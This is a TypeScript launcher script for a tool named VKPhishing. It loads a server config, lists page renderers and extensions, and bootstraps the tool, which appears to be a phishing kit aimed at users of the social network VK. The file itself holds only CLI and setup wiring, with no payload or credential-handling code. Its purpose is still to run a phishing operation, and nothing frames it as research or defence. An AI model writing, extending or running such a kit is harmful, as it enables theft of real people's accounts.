import { readFileSync } from 'fs'
import { join } from 'path'
import * as yargs from 'yargs'
import { parse as parseYaml } from 'yaml'
import consola from 'consola'
import * as renderers from './renderers'
import * as phishing from '.'

const config = parseYaml(
  readFileSync(join(__dirname, '..', 'config', 'server.yml'), {
    encoding: 'utf8'
  })
)

async function main(args: any) {
  // consola.log(args)

  if (args.listRenderers) {
    consola.info('Renderers: ')

    let i = 0

    for (const r of Object.keys(renderers)) {
      consola.log(`${++i}) ${r}`)
    }

    return
  }

  if (args.listExtensions) {
    consola.info('Extensions: ')

    let i = 0

    for (const xid in phishing.builtinExtensions) {
      const x =
        phishing.builtinExtensions[
          xid as keyof typeof phishing.builtinExtensions
        ]

      if (x.__meta__) {
        consola.log(`${++i}) ${x.__meta__.name}: \n${x.__meta__.description}`)
      } else {
        consola.log(`${++i}) Unknown extension "${xid}"`)
      }
    }

    return
  }

  if (!(args.renderer in renderers)) {
    throw new Error(`Renderer "${args.renderer}" not found`)
  }

  const ph = new phishing.VKPhishing(
    config.extensions.map((extName: string) => {
      if (extName in phishing.builtinExtensions) {
        return phishing.builtinExtensions[
          extName as keyof typeof phishing.builtinExtensions
        ]
      } else {
        throw new Error(`Extension "${extName}" not found`)
      }
    })
  )

  const renderer = renderers[
    args.renderer as keyof typeof renderers
  ] as renderers.RendererGetter

  await phishing.bootstrap(ph, renderer)
}

main(yargs.alias('r', 'renderer').default('r', 'static').argv)
